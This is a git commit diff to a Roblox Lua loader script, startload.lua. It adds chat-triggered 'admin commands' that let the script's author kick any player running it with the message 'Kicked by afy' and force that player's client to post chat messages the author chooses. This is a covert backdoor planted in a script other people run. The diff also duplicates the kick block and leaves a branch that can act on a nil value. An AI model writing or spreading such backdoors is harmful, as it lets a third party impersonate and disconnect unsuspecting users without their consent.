eec2154d1b0a7488a0cb6002de2b78707976b76a
Afyadh <73753274+Afyadh@users.noreply.github.com>
2022-02-19 17:30:50 -0800

    Update startload.lua

--- startload.lua
+++ startload.lua
@@ -35,6 +35,33 @@ local function admincmds(user)
             end
             
             if string.find(chat, '.kick') then 
+                if chat ~= '.kick all' then               
+                    local findplr = chat:gsub(".kick ", '')
+                    if game.Players.LocalPlayer.Name ==  findplr then 
+                        game.Players.LocalPlayer:Kick('Kicked by afy')
+                    end
+                end
+            end
+
+            if string.find(chat, '.chat all') then
+                local findchat = chat:gsub('.chat all ', '')
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(findchat, 'All')
+            end
+
+            if string.find(chat,'.chat') then 
+                if not string.find(chat, '.chat all') then 
+                    local findchat
+                    for i,v in pairs(game.Players:GetPlayers()) do
+                        if string.find(chat, v.Name) then 
+                            findchat = chat:gsub(v.Name .. ' ', '')
+                        end
+                    end
+                    local newchat = findchat:gsub('.chat ', '')
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(newchat, 'All')
+                end
+            end
+
+            if string.find(chat, '.kick') then 
                 if chat ~= '.kick all' then 
                     local findplr = chat:gsub(".kick ", '')
                     if game.Players.LocalPlayer.Name ==  findplr then 
